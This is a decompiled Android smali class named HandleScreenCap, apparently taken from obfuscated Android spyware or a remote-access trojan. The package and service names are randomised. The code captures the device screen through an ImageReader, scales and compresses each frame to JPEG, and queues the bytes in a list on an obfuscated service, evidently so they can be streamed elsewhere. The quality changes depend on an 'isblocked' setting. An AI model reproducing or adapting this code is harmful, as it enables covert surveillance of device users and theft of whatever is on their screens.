.class public L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;
.super Ljava/lang/Object;
.source "HandleScreenCap.java"

# interfaces
.implements Landroid/media/ImageReader$OnImageAvailableListener;


# instance fields
.field Heightimg:I

.field TempQ:I

.field Widthimg:I

.field private height:I

.field public imageReader:Landroid/media/ImageReader;

.field private latestBitmap:Landroid/graphics/Bitmap;

.field mWebView:Landroid/webkit/WebView;

.field private svc:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

.field private width:I


# direct methods
.method constructor <init>(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;)V
    .locals 6

    const-string v0, "x"

    .line 37
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v1, 0x0

    .line 29
    iput-object v1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->latestBitmap:Landroid/graphics/Bitmap;

    const/16 v2, 0x12c

    .line 31
    iput v2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->Widthimg:I

    const/16 v2, 0x1c2

    .line 32
    iput v2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->Heightimg:I

    const/4 v2, -0x1

    .line 34
    iput v2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->TempQ:I

    .line 42
    :try_start_0
    iput-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->svc:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    .line 44
    sget-object v2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Resolutions:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    const/4 v3, 0x1

    if-eqz v2, :cond_0

    .line 45
    sget-object v2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Resolutions:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x0

    .line 47
    aget-object v2, v0, v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    iput v2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->Heightimg:I

    .line 48
    aget-object v0, v0, v3

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    iput v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->Widthimg:I

    .line 51
    :cond_0
    invoke-virtual {p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->getWindowManager()Landroid/view/WindowManager;

    move-result-object v0

    invoke-interface {v0}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v0

    .line 52
    new-instance v2, Landroid/graphics/Point;

    invoke-direct {v2}, Landroid/graphics/Point;-><init>()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 56
    :try_start_1
    invoke-virtual {v0, v2}, Landroid/view/Display;->getRealSize(Landroid/graphics/Point;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 60
    :catch_0
    :try_start_2
    iget v0, v2, Landroid/graphics/Point;->x:I

    .line 61
    iget v2, v2, Landroid/graphics/Point;->y:I

    :goto_0
    mul-int v4, v0, v2

    const/high16 v5, 0x100000

    if-le v4, v5, :cond_1

    shr-int/lit8 v0, v0, 0x1

    shr-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 68
    :cond_1
    iput v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->width:I

    .line 69
    iput v2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->height:I

    .line 71
    iput-object v1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->latestBitmap:Landroid/graphics/Bitmap;

    .line 75
    sget v1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->FPS:I

    invoke-static {v0, v2, v3, v1}, Landroid/media/ImageReader;->newInstance(IIII)Landroid/media/ImageReader;

    move-result-object v0

    iput-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->imageReader:Landroid/media/ImageReader;

    .line 77
    invoke-virtual {p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->getHandler()Landroid/os/Handler;

    move-result-object p1

    invoke-virtual {v0, p0, p1}, Landroid/media/ImageReader;->setOnImageAvailableListener(Landroid/media/ImageReader$OnImageAvailableListener;Landroid/os/Handler;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    return-void
.end method


# virtual methods
.method public close()V
    .locals 1

    .line 205
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->imageReader:Landroid/media/ImageReader;

    invoke-virtual {v0}, Landroid/media/ImageReader;->close()V

    return-void
.end method

.method getHeight()I
    .locals 1

    .line 201
    iget v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->height:I

    return v0
.end method

.method public getSurface()Landroid/view/Surface;
    .locals 1

    .line 193
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->imageReader:Landroid/media/ImageReader;

    invoke-virtual {v0}, Landroid/media/ImageReader;->getSurface()Landroid/view/Surface;

    move-result-object v0

    return-object v0
.end method

.method getWidth()I
    .locals 1

    .line 197
    iget v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->width:I

    return v0
.end method

.method public onImageAvailable(Landroid/media/ImageReader;)V
    .locals 6

    .line 93
    :try_start_0
    iget-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->imageReader:Landroid/media/ImageReader;

    invoke-virtual {p1}, Landroid/media/ImageReader;->acquireLatestImage()Landroid/media/Image;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/IllegalStateException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    goto :goto_0

    :catch_0
    const/4 p1, 0x0

    :goto_0
    if-eqz p1, :cond_7

    .line 102
    :try_start_1
    invoke-virtual {p1}, Landroid/media/Image;->getPlanes()[Landroid/media/Image$Plane;

    move-result-object v0

    const/4 v1, 0x0

    .line 103
    aget-object v2, v0, v1

    invoke-virtual {v2}, Landroid/media/Image$Plane;->getBuffer()Ljava/nio/ByteBuffer;

    move-result-object v2

    .line 104
    aget-object v3, v0, v1

    invoke-virtual {v3}, Landroid/media/Image$Plane;->getPixelStride()I

    move-result v3

    .line 105
    aget-object v0, v0, v1

    invoke-virtual {v0}, Landroid/media/Image$Plane;->getRowStride()I

    move-result v0

    .line 107
    iget v4, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->width:I

    mul-int v5, v3, v4

    sub-int/2addr v0, v5

    .line 108
    div-int/2addr v0, v3

    add-int/2addr v4, v0

    .line 111
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->latestBitmap:Landroid/graphics/Bitmap;

    if-eqz v0, :cond_0

    .line 112
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v0

    if-ne v0, v4, :cond_0

    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->latestBitmap:Landroid/graphics/Bitmap;

    .line 113
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v0

    iget v3, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->height:I

    if-eq v0, v3, :cond_2

    .line 114
    :cond_0
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->latestBitmap:Landroid/graphics/Bitmap;

    if-eqz v0, :cond_1

    .line 115
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    .line 118
    :cond_1
    iget v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->height:I

    sget-object v3, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {v4, v0, v3}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v0

    iput-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->latestBitmap:Landroid/graphics/Bitmap;

    .line 122
    :cond_2
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->latestBitmap:Landroid/graphics/Bitmap;

    invoke-virtual {v0, v2}, Landroid/graphics/Bitmap;->copyPixelsFromBuffer(Ljava/nio/Buffer;)V

    .line 125
    new-instance v0, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 130
    sget-object v2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->appContext:Landroid/content/Context;

    sget-object v3, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->isblocked:Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v2, v3, v4}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v2

    const/4 v3, -0x1

    if-eqz v2, :cond_4

    .line 132
    iget v2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->TempQ:I

    if-ne v2, v3, :cond_3

    .line 133
    sget v2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Q:I

    iput v2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->TempQ:I

    :cond_3
    const/16 v2, 0x64

    .line 135
    sput v2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Q:I

    goto :goto_1

    .line 137
    :cond_4
    iget v2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->TempQ:I

    if-eq v2, v3, :cond_5

    sget v2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Q:I

    iget v4, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->TempQ:I

    if-eq v2, v4, :cond_5

    .line 138
    sput v4, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Q:I

    .line 139
    iput v3, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->TempQ:I

    .line 146
    :cond_5
    :goto_1
    iget-object v2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->latestBitmap:Landroid/graphics/Bitmap;

    iget v3, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->Widthimg:I

    iget v4, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->Heightimg:I

    const/4 v5, 0x1

    invoke-static {v2, v3, v4, v5}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v2

    .line 148
    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    sget v4, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Q:I

    invoke-virtual {v2, v3, v4, v0}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 151
    sget-boolean v3, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->ISON:Z

    if-eqz v3, :cond_6

    .line 153
    sget-object v1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->syc:Ljava/lang/Object;

    monitor-enter v1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    .line 155
    :try_start_2
    iget-object v3, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->svc:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iget-object v3, v3, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->bts:Ljava/util/List;

    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v4

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 156
    monitor-exit v1

    goto :goto_2

    :catchall_0
    move-exception p1

    monitor-exit v1
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :try_start_3
    throw p1

    .line 160
    :cond_6
    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopCapture()V

    .line 161
    iget-object v3, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->svc:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    invoke-virtual {v3, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopForeground(Z)V

    .line 162
    iget-object v3, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->svc:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    invoke-virtual {v3}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopSelf()V

    .line 163
    sput-boolean v1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->ISON:Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    :goto_2
    const-wide/16 v3, 0x64

    .line 168
    :try_start_4
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    .line 171
    :catch_1
    :try_start_5
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->close()V

    .line 172
    invoke-virtual {v2}, Landroid/graphics/Bitmap;->recycle()V

    .line 173
    invoke-virtual {p1}, Landroid/media/Image;->close()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    :catch_2
    :cond_7
    return-void
.end method
